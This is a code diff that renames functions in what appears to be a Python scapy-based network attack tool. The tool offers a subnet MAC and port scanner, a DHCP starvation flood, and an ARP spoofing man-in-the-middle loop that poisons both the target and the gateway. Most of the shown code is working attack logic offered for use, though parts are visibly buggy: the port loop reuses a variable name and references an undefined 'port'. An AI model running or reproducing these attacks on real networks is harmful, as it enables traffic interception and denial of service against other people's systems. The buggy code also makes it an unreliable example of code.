@@ -6,7 +6,7 @@ from scapy.all import *
 from threading import Thread
 import sys , time
 from colorama import Fore as C
-def p(text):
+def print_text(text):
     for i in text:
         print(i , end='' , flush=True)
         time.sleep(0.3)
@@ -15,44 +15,44 @@ class Mac:
         self.ip1 = ip_1
         self.ip2 = ip_2
         
-    def Create_Range_Ip(self):
+    def create_range_ip(self):
         self.list_ip = [str(IPAddress(i)) for i in range(int(IPAddress(self.ip1)) , int(IPAddress(self.ip2))+1)]
-        p(f'{C.GREEN}Created All Ranges Ips..!')
+        print_text(f'{C.GREEN}Created All Ranges Ips..!')
         time.sleep(3)
 
-    def Get_Mac_Addres(self):
-        p(f"{C.GREEN}Get Mac All Systems..! ")
+    def get_mac_addres(self):
+        print_text(f"{C.GREEN}Get Mac All Systems..! ")
         self.Mac_List = [get_mac_address(i) for i in self.list_ip]
     
-    def Ports(self):
+    def ports(self):
         self.list_port = []
-        p(f"{C.GREEN}Run Port Scanner..!")
+        print_text(f"{C.GREEN}Run Port Scanner..!")
         try:
             target = socket.gethostbyname(self.ip1)
             for p in range(1,80):
                 sockets = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 socket.setdefaulttimeout(1)
                 data = sockets.connect_ex((target,port))
-                p(f"{C.YELLOW}Checking..!")
+                print_text(f"{C.YELLOW}Checking..!")
                 if data == 0:
                     self.list_port.append(p)
                 sockets.close()
                 system('cls')
         except:
             pass
-    def Print(self):
+    def print_data(self):
         for ip , mac in self.list_ip ,  self.Mac_List:
-            p(f"{C.GREEN}IP TARGET\t\t\t{C.GREEN}MAC ADDRESS TARGET\n{C.YELLOW}{ip}\t\t\t{mac}{C.WHITE}"+"-"*7 +"\t\t"+"-"*7+'\n')    
+            print_text(f"{C.GREEN}IP TARGET\t\t\t{C.GREEN}MAC ADDRESS TARGET\n{C.YELLOW}{ip}\t\t\t{mac}{C.WHITE}"+"-"*7 +"\t\t"+"-"*7+'\n')    
             for port in self.list_port:
                 if port:
-                    p(f"{C.LIGHTGREEN_EX}PORT\t\t{C.GREEN}{port}{C.LIGHTGREEN_EX}/tcp")
+                    print_text(f"{C.LIGHTGREEN_EX}PORT\t\t{C.GREEN}{port}{C.LIGHTGREEN_EX}/tcp")
                 else:
                     pass
 class dhcp:
     def __init__(self , Number , inface):
         self.num_ = Number
         self.Ifas = inface
-    def Attack(self):
+    def attack(self):
         dhcp_request = Ether(src=get_if_hwaddr(self.Ifas),dst="ff:ff:ff:ff:ff:ff")\
                             /IP(src="0.0.0.0",dst="255.255.255.255")\
                             /UDP(sport=68,dport=67)\
@@ -99,15 +99,15 @@ if __name__ == "__main__":
         system('clear')
         ip = input(f"{C.MAGENTA}Enter The Range Ip {C.YELLOW}[192.168.1.1 , 192.168.1.255] -->{C.GREEN}  ")
         mac = Mac(ip.split(",")[0].replace(' ', ''), ip.split(",")[1].replace(' ', ''))
-        mac.Create_Range_Ip()
-        mac.Ports()
-        mac.Get_Mac_Addres()
-        mac.Print()
+        mac.create_range_ip()
+        mac.ports()
+        mac.get_mac_addres()
+        mac.print_data()
     elif num == '2':
         system('clear')
         inface = input(f"{C.MAGENTA}Enter The Name interface{C.YELLOW} --> ")
         Dhcp = dhcp(int(input(f'{C.MAGENTA}Enter The Count Packet [1 == 10k Packet] {C.YELLOW}--> ') ) , inface)
-        Dhcp.Attack()
+        Dhcp.attack()
     elif num == '3':
         system('clear')
         target_ip = input(f'{C.MAGENTA}Enter The Ip Target {C.YELLOW}--> ')
@@ -121,13 +121,13 @@ if __name__ == "__main__":
                 try:
                     arp_1 = Arp(target_ip, gateway_ip)
                     arp_1.spoof()
-                    p(f"{C.CYAN}[{count+1}]{C.GREEN}Packet Was Sent -->{C.YELLOW} {target_ip}")
+                    print_text(f"{C.CYAN}[{count+1}]{C.GREEN}Packet Was Sent -->{C.YELLOW} {target_ip}")
                     arp_2 = Arp(gateway_ip,target_ip)
                     arp_2.spoof()
-                    p(f"{C.CYAN}[{count+1}]{C.GREEN}Packet Was Sent -->{C.YELLOW} {gateway_ip}")
+                    print_text(f"{C.CYAN}[{count+1}]{C.GREEN}Packet Was Sent -->{C.YELLOW} {gateway_ip}")
                 except:
-                    p(f"{C.RED}Error")
+                    print_text(f"{C.RED}Error")
                     sys.exit()
         except:
             arp.restore()
-            p(f"{C.RED}Error Arp Spoofing Stoped..!")
+            print_text(f"{C.RED}Error Arp Spoofing Stoped..!")
